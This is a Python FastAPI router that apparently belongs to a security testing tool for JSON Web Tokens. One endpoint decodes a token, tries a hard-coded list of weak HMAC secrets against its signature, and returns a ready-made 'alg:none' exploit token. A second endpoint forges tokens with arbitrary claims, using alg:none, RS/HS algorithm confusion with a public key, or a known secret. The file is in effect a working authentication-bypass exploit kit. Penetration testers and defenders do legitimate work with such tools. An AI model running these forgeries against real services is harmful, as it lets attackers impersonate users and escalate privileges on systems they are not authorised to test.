import sys, json, base64, hmac, hashlib
from pathlib import Path
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import Optional, Dict, Any

sys.path.insert(0, str(Path(__file__).parent.parent))

router = APIRouter()

COMMON_SECRETS = ["secret", "admin", "password", "123456", "test", "jwt_secret", "secret123", "supersecret", "key", "root"]

class JWTDecodeRequest(BaseModel):
    token: str

class JWTForgeRequest(BaseModel):
    header: Dict[str, Any]
    payload: Dict[str, Any]
    secret: Optional[str] = None
    alg_none: Optional[bool] = False
    alg_confusion: Optional[bool] = False
    public_key: Optional[str] = None

def b64_decode(data: str) -> str:
    padded = data + "=" * ((4 - len(data) % 4) % 4)
    return base64.urlsafe_b64decode(padded).decode('utf-8', errors='replace')

def b64_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

@router.post("/decode")
async def decode_jwt(req: JWTDecodeRequest):
    """Decode JWT into Header, Payload, Signature and test for vulnerabilities."""
    token = req.token.strip()
    parts = token.split('.')
    if len(parts) != 3:
        raise HTTPException(status_code=400, detail="Invalid JWT: Token must have exactly 3 dot-separated parts")

    try:
        header_str = b64_decode(parts[0])
        payload_str = b64_decode(parts[1])
        header = json.loads(header_str)
        payload = json.loads(payload_str)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Failed to parse JWT JSON: {e}")

    # Check for weak HMAC secret
    cracked_secret = None
    if header.get("alg") in ["HS256", "HS384", "HS512"]:
        msg = f"{parts[0]}.{parts[1]}".encode('utf-8')
        for s in COMMON_SECRETS:
            sig = b64_encode(hmac.new(s.encode(), msg, hashlib.sha256).digest())
            if sig == parts[2]:
                cracked_secret = s
                break

    # Forge alg: none token
    none_header = dict(header)
    none_header["alg"] = "none"
    none_token = f"{b64_encode(json.dumps(none_header, separators=(',', ':')).encode())}.{parts[1]}."

    return {
        "header": header,
        "payload": payload,
        "signature": parts[2],
        "is_alg_none": header.get("alg", "").lower() == "none",
        "cracked_secret": cracked_secret,
        "alg_none_exploit_token": none_token,
        "warning": "Vulnerable to alg:none attack!" if header.get("alg", "").lower() == "none" else None
    }

@router.post("/forge")
async def forge_jwt(req: JWTForgeRequest):
    """Forge a new JWT with modified claims or alg:none."""
    try:
        header = dict(req.header)
        if req.alg_none:
            header["alg"] = "none"
        elif req.alg_confusion:
            header["alg"] = "HS256"

        h_bytes = json.dumps(header, separators=(',', ':')).encode('utf-8')
        p_bytes = json.dumps(req.payload, separators=(',', ':')).encode('utf-8')

        h_b64 = b64_encode(h_bytes)
        p_b64 = b64_encode(p_bytes)

        if req.alg_none or header.get("alg", "").lower() == "none":
            forged = f"{h_b64}.{p_b64}."
        elif req.alg_confusion:
            key_secret = (req.public_key or req.secret or "").strip().encode('utf-8')
            msg = f"{h_b64}.{p_b64}".encode('utf-8')
            sig = b64_encode(hmac.new(key_secret, msg, hashlib.sha256).digest())
            forged = f"{h_b64}.{p_b64}.{sig}"
        else:
            secret = (req.secret or "").encode('utf-8')
            msg = f"{h_b64}.{p_b64}".encode('utf-8')
            sig = b64_encode(hmac.new(secret, msg, hashlib.sha256).digest())
            forged = f"{h_b64}.{p_b64}.{sig}"

        return {
            "token": forged,
            "algorithm": header.get("alg", "none"),
            "length": len(forged),
            "status": "Forged Successfully"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
